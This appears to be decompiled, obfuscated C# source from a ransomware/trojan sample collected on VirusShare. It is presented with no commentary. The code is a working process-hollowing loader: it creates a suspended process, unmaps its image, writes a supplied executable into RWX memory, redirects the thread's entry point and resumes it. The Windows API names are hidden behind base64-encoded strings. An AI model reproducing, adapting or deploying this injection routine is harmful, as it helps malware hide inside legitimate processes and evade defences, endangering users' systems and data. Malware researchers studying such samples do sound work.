// Decompiled with JetBrains decompiler
// Type: .
// Assembly: fe64d8c2-dc44-4388-ab3c-b2f70f696e6b, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AAC993D7-E494-4D2E-8994-D4537A031819
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-57b3b74addf88b0a5a3696c8126023d8603e667524dc220b61597349503669b3.exe

using \u0095;
using \u009F;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0095
{
  internal sealed class \u0094
  {
    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u009B\u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u009C\u0002([In] IntPtr obj0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static T \u009D\u0002<T>([In] string obj0, [In] string obj1)
    {
      try
      {
        return (T) Marshal.GetDelegateForFunctionPointer(\u0094.\u009C\u0002(\u0094.\u009B\u0002(ref obj0), ref obj1), typeof (T));
      }
      catch (Exception ex)
      {
        T obj;
        // ISSUE: variable of a boxed type
        __Boxed<T> local = (object) obj;
        string str1 = obj0;
        string str2 = obj1;
        throw UnhandledException.\u0090\u0002(ex, (object) local, (object) str1, (object) str2);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool \u009E\u0002([In] byte[] obj0, [In] string obj1)
    {
      \u0094.\u0096 obj2;
      \u0094.\u009C obj3;
      \u0094.\u0098 obj4;
      \u0094.\u0099 obj5;
      \u0094.\u0097 obj6;
      \u0094.\u009D obj7;
      \u0094.\u009B obj8;
      \u0094.\u009A obj9;
      IntPtr zero1;
      IntPtr[] poegrpgaokukwhbc;
      byte[] fjplrhicndhdizglrwr;
      int int32_1;
      int int16;
      IntPtr gobjshapdwhffjwrqj;
      uint[] numArray1;
      IntPtr iesuuhchynegvvzlqz;
      IntPtr zero2;
      IntPtr kgvischhvgphidni;
      IntPtr zero3;
      IntPtr num1;
      IntPtr num2;
      IntPtr dvjxepuaeohgthdhpei;
      int int32_2;
      int sfztruhrredwfadfexn;
      int num3;
      int num4;
      int num5;
      int[] dst;
      byte[] numArray2;
      bool flag;
      try
      {
        obj2 = \u0094.\u009D\u0002<\u0094.\u0096>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221342))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221370))));
        obj3 = \u0094.\u009D\u0002<\u0094.\u009C>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221414))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221442))));
        obj4 = \u0094.\u009D\u0002<\u0094.\u0098>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221494))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221522))));
        obj5 = \u0094.\u009D\u0002<\u0094.\u0099>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221574))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221602))));
        obj6 = \u0094.\u009D\u0002<\u0094.\u0097>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221646))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221674))));
        obj7 = \u0094.\u009D\u0002<\u0094.\u009D>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221726))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221754))));
        obj8 = \u0094.\u009D\u0002<\u0094.\u009B>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221806))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221834))));
        obj9 = \u0094.\u009D\u0002<\u0094.\u009A>(Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221870))), Encoding.UTF8.GetString(Convert.FromBase64String(\u009E.\u0001\u0003(221890))));
        try
        {
          zero1 = IntPtr.Zero;
          poegrpgaokukwhbc = new IntPtr[4];
          fjplrhicndhdizglrwr = new byte[68];
          int32_1 = BitConverter.ToInt32(obj0, 60);
          int16 = (int) BitConverter.ToInt16(obj0, checked (int32_1 + 6));
          gobjshapdwhffjwrqj = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 84)));
          if (obj2((string) null, new StringBuilder(obj1), zero1, zero1, false, 4, zero1, (string) null, fjplrhicndhdizglrwr, poegrpgaokukwhbc))
          {
            numArray1 = new uint[179];
            numArray1[0] = 65538U;
            if (obj3(poegrpgaokukwhbc[1], numArray1))
            {
              iesuuhchynegvvzlqz = new IntPtr(checked ((long) numArray1[41] + 8L));
              zero2 = IntPtr.Zero;
              kgvischhvgphidni = new IntPtr(4);
              zero3 = IntPtr.Zero;
              if (obj4(poegrpgaokukwhbc[0], iesuuhchynegvvzlqz, ref zero2, (int) kgvischhvgphidni, ref zero3) && obj9(poegrpgaokukwhbc[0], zero2) == 0U)
              {
                num1 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 52)));
                num2 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 80)));
                dvjxepuaeohgthdhpei = obj5(poegrpgaokukwhbc[0], num1, num2, 12288, 64);
                int32_2 = dvjxepuaeohgthdhpei.ToInt32();
                int num6 = obj6(poegrpgaokukwhbc[0], dvjxepuaeohgthdhpei, obj0, checked ((uint) (int) gobjshapdwhffjwrqj), sfztruhrredwfadfexn) ? 1 : 0;
                num3 = checked (int16 - 1);
                num4 = num3;
                num5 = 0;
                while (num5 <= num4)
                {
                  dst = new int[10];
                  Buffer.BlockCopy((Array) obj0, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                  numArray2 = new byte[checked (dst[4] - 1 + 1)];
                  Buffer.BlockCopy((Array) obj0, dst[5], (Array) numArray2, 0, numArray2.Length);
                  num2 = new IntPtr(checked (int32_2 + dst[3]));
                  num1 = new IntPtr(numArray2.Length);
                  int num7 = obj6(poegrpgaokukwhbc[0], num2, numArray2, checked ((uint) (int) num1), sfztruhrredwfadfexn) ? 1 : 0;
                  checked { ++num5; }
                }
                num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
                num1 = new IntPtr(4);
                int num8 = obj6(poegrpgaokukwhbc[0], num2, BitConverter.GetBytes(dvjxepuaeohgthdhpei.ToInt32()), checked ((uint) (int) num1), sfztruhrredwfadfexn) ? 1 : 0;
                numArray1[44] = checked ((uint) (dvjxepuaeohgthdhpei.ToInt32() + BitConverter.ToInt32(obj0, int32_1 + 40)));
                int num9 = obj7(poegrpgaokukwhbc[1], numArray1) ? 1 : 0;
              }
            }
            int num10 = (int) obj8(poegrpgaokukwhbc[1]);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = false;
          ProjectData.ClearProjectError();
          goto label_11;
        }
        return true;
label_11:
        return flag;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[32]
        {
          (object) obj6,
          (object) obj4,
          (object) obj8,
          (object) obj9,
          (object) flag,
          (object) obj2,
          (object) obj7,
          (object) obj5,
          (object) obj3,
          (object) int32_1,
          (object) poegrpgaokukwhbc,
          (object) fjplrhicndhdizglrwr,
          (object) zero1,
          (object) int16,
          (object) gobjshapdwhffjwrqj,
          (object) numArray1,
          (object) iesuuhchynegvvzlqz,
          (object) zero3,
          (object) kgvischhvgphidni,
          (object) zero2,
          (object) num1,
          (object) dvjxepuaeohgthdhpei,
          (object) sfztruhrredwfadfexn,
          (object) num2,
          (object) int32_2,
          (object) num3,
          (object) numArray2,
          (object) num5,
          (object) dst,
          (object) num4,
          (object) obj0,
          (object) obj1
        };
        throw UnhandledException.\u0098\u0002(ex, objArray);
      }
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0096(
      string ietrditgqlkybeccz,
      StringBuilder gisswaffbyrczcjbek,
      IntPtr tddvzyuanpptiley,
      IntPtr ycqlhnopsrfcrqntkq,
      [MarshalAs(UnmanagedType.Bool)] bool eaujxngrghxreezr,
      int jagdrflhlgcppngkw,
      IntPtr qftzyqcyyhqalvcldis,
      string bvdqwpklthusqazhws,
      byte[] fjplrhicndhdizglrwr,
      IntPtr[] poegrpgaokukwhbc);

    public delegate bool \u0097(
      IntPtr hiknaiiqyqcrskcd,
      IntPtr dvjxepuaeohgthdhpei,
      byte[] rayhtovktvtpnqsprofv,
      uint gobjshapdwhffjwrqj,
      int sfztruhrredwfadfexn);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0098(
      IntPtr hpjvxhftkugsddeoaxrv,
      IntPtr iesuuhchynegvvzlqz,
      ref IntPtr aanqiibdlcdgsyaiuthg,
      int kgvischhvgphidni,
      ref IntPtr tnieryiajydgnfah);

    public delegate IntPtr \u0099(
      IntPtr ptxvzenhfiyxjrukuiaa,
      IntPtr gwsrduhhhelsotxpp,
      IntPtr wscnyxncgrtvlwsjy,
      int oykcpqvtqoonaicn,
      int bsgijtjjdskoknjpk);

    public delegate uint \u009A(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

    public delegate uint \u009B(IntPtr lcelxaicxuenriantqju);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u009C(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u009D(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);
  }
}
